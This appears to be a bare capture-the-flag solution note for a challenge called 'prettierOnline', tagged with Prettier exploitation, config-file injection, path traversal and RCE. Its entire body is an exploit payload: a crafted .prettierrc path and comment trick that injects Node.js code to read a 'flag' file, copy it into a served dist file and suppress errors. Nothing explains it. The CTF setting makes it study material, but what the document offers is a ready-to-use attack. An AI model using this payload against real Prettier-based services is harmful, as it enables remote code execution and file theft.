---
tags: [Prettier利用, 配置文件注入, 路径穿越, RCE, Node.js]
---

# prettierOnline

```
/*/../app/.prettierrc
#*/const fs = require('fs'); var a = fs.readFileSync("flag", "utf-
8");fs.writeFileSync("./dist/ret.js",a);fs.chmodSync("./dist/ret.js",0o444);process.add
Listener('uncaughtException', (err) => {console.log("ss",err);process.exit(0);})
```

